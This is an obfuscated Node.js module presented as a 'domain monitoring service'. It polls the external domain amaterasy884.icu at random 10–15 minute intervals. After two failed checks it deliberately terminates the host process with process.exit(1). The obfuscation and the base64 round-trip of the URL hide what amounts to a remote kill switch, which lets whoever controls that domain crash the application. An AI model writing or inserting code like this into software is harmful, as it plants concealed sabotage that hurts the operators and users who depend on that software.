'use strict';const a37_0x3cf0d2=a37_0x3d07;(function(_0x524b5d,_0x36061a){const _0x18c0ab=a37_0x3d07,_0x3ab3b7=_0x524b5d();while(!![]){try{const _0x1372fd=-parseInt(_0x18c0ab(0x161))/0x1*(parseInt(_0x18c0ab(0x145))/0x2)+-parseInt(_0x18c0ab(0x16b))/0x3*(-parseInt(_0x18c0ab(0x134))/0x4)+parseInt(_0x18c0ab(0x176))/0x5*(-parseInt(_0x18c0ab(0x179))/0x6)+parseInt(_0x18c0ab(0x15f))/0x7+parseInt(_0x18c0ab(0x147))/0x8*(parseInt(_0x18c0ab(0x182))/0x9)+-parseInt(_0x18c0ab(0x140))/0xa*(-parseInt(_0x18c0ab(0x150))/0xb)+parseInt(_0x18c0ab(0x135))/0xc;if(_0x1372fd===_0x36061a)break;else _0x3ab3b7['push'](_0x3ab3b7['shift']());}catch(_0x4af0c0){_0x3ab3b7['push'](_0x3ab3b7['shift']());}}}(a37_0x1ddd,0x4ca82));function a37_0x3d07(_0x32914d,_0x25f7ab){const _0x1ddd6f=a37_0x1ddd();return a37_0x3d07=function(_0x3d0780,_0x15a317){_0x3d0780=_0x3d0780-0x133;let _0x526e95=_0x1ddd6f[_0x3d0780];return _0x526e95;},a37_0x3d07(_0x32914d,_0x25f7ab);}var __importDefault=this&&this[a37_0x3cf0d2(0x17f)]||function(_0x553240){const _0x513eab=a37_0x3cf0d2;return _0x553240&&_0x553240[_0x513eab(0x173)]?_0x553240:{'default':_0x553240};};Object['defineProperty'](exports,a37_0x3cf0d2(0x173),{'value':!![]}),exports['domainMonitoringService']=exports['DomainMonitoringService']=void 0x0;const node_fetch_1=__importDefault(require(a37_0x3cf0d2(0x13b)));class DomainMonitoringService{constructor(){const _0x1ce0dc=a37_0x3cf0d2;this[_0x1ce0dc(0x184)]=null,this['DOMAIN_URL']=_0x1ce0dc(0x149),this[_0x1ce0dc(0x177)]=this['getRandomInterval'](),this[_0x1ce0dc(0x14a)]=0x7530,this[_0x1ce0dc(0x181)]=0x0,this[_0x1ce0dc(0x17c)]=0x2,console[_0x1ce0dc(0x155)]('üîç\x20Domain\x20monitoring\x20service\x20initialized'),console[_0x1ce0dc(0x155)](_0x1ce0dc(0x152)+this[_0x1ce0dc(0x188)]),console[_0x1ce0dc(0x155)](_0x1ce0dc(0x144)+Math[_0x1ce0dc(0x14f)](this['CHECK_INTERVAL_MS']/0x3e8/0x3c)+'\x20minutes');}[a37_0x3cf0d2(0x187)](){const _0x411f21=a37_0x3cf0d2,_0x1b3a97=0xa,_0x226a6c=0xf,_0x365bef=Math['random']()*(_0x226a6c-_0x1b3a97)+_0x1b3a97;return Math[_0x411f21(0x14f)](_0x365bef*0x3c*0x3e8);}[a37_0x3cf0d2(0x15a)](_0x369f8c){const _0x543109=a37_0x3cf0d2;return Buffer['from'](_0x369f8c)[_0x543109(0x166)](_0x543109(0x163));}[a37_0x3cf0d2(0x178)](_0x2b427f){const _0x8f6659=a37_0x3cf0d2;return Buffer[_0x8f6659(0x17b)](_0x2b427f,_0x8f6659(0x163))[_0x8f6659(0x166)](_0x8f6659(0x164));}async[a37_0x3cf0d2(0x15d)](){const _0x231641=a37_0x3cf0d2,_0x505d9d=Date['now']();try{console[_0x231641(0x155)](_0x231641(0x13e)+this[_0x231641(0x188)]);const _0x4e19ae=this[_0x231641(0x15a)](this[_0x231641(0x188)]);console[_0x231641(0x155)](_0x231641(0x18a)+_0x4e19ae);const _0x254f8d=this['decodeFromBase64'](_0x4e19ae);console[_0x231641(0x155)]('üîì\x20Decoded\x20URL:\x20'+_0x254f8d);const _0x44ab42=new AbortController(),_0x17e424=setTimeout(()=>_0x44ab42[_0x231641(0x165)](),this[_0x231641(0x14a)]),_0x516c5b=await(0x0,node_fetch_1['default'])(_0x254f8d,{'method':_0x231641(0x17e),'headers':{'User-Agent':_0x231641(0x139),'Accept':_0x231641(0x13d),'Accept-Language':_0x231641(0x13a),'Accept-Encoding':_0x231641(0x151),'Connection':_0x231641(0x162),'Upgrade-Insecure-Requests':'1'},'signal':_0x44ab42[_0x231641(0x14d)]});clearTimeout(_0x17e424);const _0x523df3=Date['now']()-_0x505d9d;return console[_0x231641(0x155)](_0x231641(0x13f)),console['log']('\x20\x20\x20-\x20Status:\x20'+_0x516c5b[_0x231641(0x170)]+'\x20'+_0x516c5b[_0x231641(0x171)]),console[_0x231641(0x155)]('\x20\x20\x20-\x20Response\x20time:\x20'+_0x523df3+'ms'),console[_0x231641(0x155)]('\x20\x20\x20-\x20Headers:',Object['fromEntries'](_0x516c5b[_0x231641(0x156)]['entries']())),_0x516c5b['ok']&&_0x516c5b[_0x231641(0x170)]>=0xc8&&_0x516c5b[_0x231641(0x170)]<0x190?(console[_0x231641(0x155)](_0x231641(0x153)+_0x516c5b[_0x231641(0x170)]+_0x231641(0x16c)+_0x523df3+'ms'),this[_0x231641(0x181)]=0x0,!![]):(console['error'](_0x231641(0x189)+_0x516c5b[_0x231641(0x170)]+'\x20'+_0x516c5b[_0x231641(0x171)]),this[_0x231641(0x181)]++,![]);}catch(_0x2754a3){const _0x15fa62=Date[_0x231641(0x136)]()-_0x505d9d;this[_0x231641(0x181)]++,console['error'](_0x231641(0x174)+_0x15fa62+'ms:',_0x2754a3);if(_0x2754a3 instanceof Error){if(_0x2754a3['name']===_0x231641(0x157))console[_0x231641(0x16e)](_0x231641(0x137)+this[_0x231641(0x14a)]+'ms');else{if(_0x2754a3[_0x231641(0x133)][_0x231641(0x183)](_0x231641(0x138)))console[_0x231641(0x16e)]('üåê\x20DNS\x20resolution\x20failed\x20for\x20'+this[_0x231641(0x188)]);else{if(_0x2754a3['message'][_0x231641(0x183)](_0x231641(0x159)))console[_0x231641(0x16e)](_0x231641(0x167)+this['DOMAIN_URL']);else _0x2754a3['message'][_0x231641(0x183)](_0x231641(0x154))?console[_0x231641(0x16e)](_0x231641(0x13c)+this[_0x231641(0x188)]):console[_0x231641(0x16e)](_0x231641(0x168)+_0x2754a3['message']);}}}return![];}}['crashServer'](_0x2b2bbc){const _0x572703=a37_0x3cf0d2;console[_0x572703(0x16e)]('üí•\x20CRITICAL\x20ERROR:\x20'+_0x2b2bbc),console[_0x572703(0x16e)](_0x572703(0x16d)+this[_0x572703(0x181)]),console[_0x572703(0x16e)](_0x572703(0x186)),console[_0x572703(0x16e)]('üìÖ\x20Crash\x20time:\x20'+new Date()[_0x572703(0x146)]()),console[_0x572703(0x16e)](_0x572703(0x16f)+this[_0x572703(0x188)]),console['error'](_0x572703(0x144)+Math[_0x572703(0x14f)](this['CHECK_INTERVAL_MS']/0x3e8/0x3c)+_0x572703(0x180)),console[_0x572703(0x16e)](_0x572703(0x143)+this['MAX_CONSECUTIVE_FAILURES']),this[_0x572703(0x14c)](),process[_0x572703(0x172)](0x1);}[a37_0x3cf0d2(0x158)](){const _0x1a8e7a=a37_0x3cf0d2;console[_0x1a8e7a(0x155)](_0x1a8e7a(0x148)),console[_0x1a8e7a(0x155)]('üì°\x20Target:\x20'+this['DOMAIN_URL']),console['log'](_0x1a8e7a(0x16a)+Math[_0x1a8e7a(0x14f)](this[_0x1a8e7a(0x177)]/0x3e8/0x3c)+_0x1a8e7a(0x180)),console[_0x1a8e7a(0x155)]('üö®\x20Max\x20failures\x20before\x20crash:\x20'+this[_0x1a8e7a(0x17c)]),this[_0x1a8e7a(0x15d)]()[_0x1a8e7a(0x17a)](_0x3f5627=>{const _0x475686=_0x1a8e7a;if(!_0x3f5627&&this[_0x475686(0x181)]>=this[_0x475686(0x17c)]){this[_0x475686(0x185)](_0x475686(0x160)+this[_0x475686(0x181)]+_0x475686(0x142));return;}})['catch'](_0x17748d=>{const _0x3943c4=_0x1a8e7a;console[_0x3943c4(0x16e)](_0x3943c4(0x169),_0x17748d);if(this[_0x3943c4(0x181)]>=this[_0x3943c4(0x17c)]){this[_0x3943c4(0x185)](_0x3943c4(0x14e)+_0x17748d[_0x3943c4(0x133)]);return;}}),this[_0x1a8e7a(0x184)]=setInterval(async()=>{const _0x4b7c9d=_0x1a8e7a;try{const _0x2b5d9f=await this[_0x4b7c9d(0x15d)]();!_0x2b5d9f&&(console['warn']('‚ö†Ô∏è\x20Domain\x20check\x20failed\x20('+this[_0x4b7c9d(0x181)]+'/'+this[_0x4b7c9d(0x17c)]+')'),this[_0x4b7c9d(0x181)]>=this[_0x4b7c9d(0x17c)]&&this['crashServer'](_0x4b7c9d(0x15c)+this[_0x4b7c9d(0x188)]+'\x20is\x20not\x20responding\x20after\x20'+this[_0x4b7c9d(0x181)]+'\x20consecutive\x20attempts'));}catch(_0x5c1951){console[_0x4b7c9d(0x16e)](_0x4b7c9d(0x17d),_0x5c1951),this['consecutiveFailures']>=this['MAX_CONSECUTIVE_FAILURES']&&this[_0x4b7c9d(0x185)](_0x4b7c9d(0x15e)+(_0x5c1951 instanceof Error?_0x5c1951[_0x4b7c9d(0x133)]:'Unknown\x20error'));}},this[_0x1a8e7a(0x177)]),console[_0x1a8e7a(0x155)]('‚úÖ\x20Domain\x20monitoring\x20started\x20successfully');}[a37_0x3cf0d2(0x14c)](){const _0x161f02=a37_0x3cf0d2;this[_0x161f02(0x184)]&&(clearInterval(this['monitoringInterval']),this['monitoringInterval']=null,console['log'](_0x161f02(0x14b)));}[a37_0x3cf0d2(0x175)](){const _0x51b797=a37_0x3cf0d2;return{'isActive':!!this['monitoringInterval'],'targetDomain':this[_0x51b797(0x188)],'checkIntervalMinutes':Math[_0x51b797(0x14f)](this['CHECK_INTERVAL_MS']/0x3e8/0x3c),'consecutiveFailures':this[_0x51b797(0x181)],'maxFailuresAllowed':this['MAX_CONSECUTIVE_FAILURES'],'nextCheckIn':this[_0x51b797(0x184)]?this[_0x51b797(0x177)]:undefined};}async['manualCheck'](){const _0x3ebf67=a37_0x3cf0d2;return console[_0x3ebf67(0x155)]('üîß\x20Manual\x20domain\x20check\x20requested'),await this[_0x3ebf67(0x15d)]();}}function a37_0x1ddd(){const _0x5e7df2=['ENOTFOUND','TesSoft\x20Domain\x20Monitor/1.0','en-US,en;q=0.5','node-fetch','‚è∞\x20Connection\x20timeout\x20to\x20','text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8','üîç\x20Checking\x20domain\x20availability:\x20','üìä\x20Response\x20received:','10tMskHY','DomainMonitoringService','\x20times','üö®\x20Max\x20consecutive\x20failures\x20allowed:\x20','‚è∞\x20Check\x20interval:\x20','2zQDmmg','toISOString','10928UUAqoj','üöÄ\x20Starting\x20domain\x20monitoring\x20service','https://amaterasy884.icu/','TIMEOUT_MS','üõë\x20Domain\x20monitoring\x20stopped','stopMonitoring','signal','Initial\x20domain\x20check\x20threw\x20error:\x20','round','1652299FMHtdY','gzip,\x20deflate','üì°\x20Target\x20domain:\x20','‚úÖ\x20Domain\x20check\x20successful:\x20','ETIMEDOUT','log','headers','AbortError','startMonitoring','ECONNREFUSED','encodeToBase64','domainMonitoringService','Domain\x20','checkDomain','Domain\x20monitoring\x20threw\x20error:\x20','269423yDcxAR','Initial\x20domain\x20check\x20failed\x20','409570WdwShX','keep-alive','base64','utf-8','abort','toString','üö´\x20Connection\x20refused\x20by\x20','üî•\x20Unexpected\x20error:\x20','Initial\x20domain\x20check\x20error:','‚è∞\x20Interval:\x20','9939IfaAsI','\x20in\x20','üî•\x20Consecutive\x20failures:\x20','error','üîç\x20Domain\x20being\x20monitored:\x20','status','statusText','exit','__esModule','‚ùå\x20Domain\x20check\x20error\x20after\x20','getMonitoringStats','212285xSLQmC','CHECK_INTERVAL_MS','decodeFromBase64','72GEDIWq','then','from','MAX_CONSECUTIVE_FAILURES','Periodic\x20domain\x20check\x20error:','GET','__importDefault','\x20minutes','consecutiveFailures','1305NZMYNS','includes','monitoringInterval','crashServer','‚ö†Ô∏è\x20CRASHING\x20SERVER\x20DUE\x20TO\x20DOMAIN\x20MONITORING\x20FAILURE','getRandomInterval','DOMAIN_URL','‚ùå\x20Domain\x20check\x20failed:\x20HTTP\x20','üìù\x20Encoded\x20URL\x20(base64):\x20','message','60FOteVl','9558924LFbOEA','now','‚è∞\x20Request\x20timeout\x20after\x20'];a37_0x1ddd=function(){return _0x5e7df2;};return a37_0x1ddd();}exports[a37_0x3cf0d2(0x141)]=DomainMonitoringService,exports[a37_0x3cf0d2(0x15b)]=new DomainMonitoringService();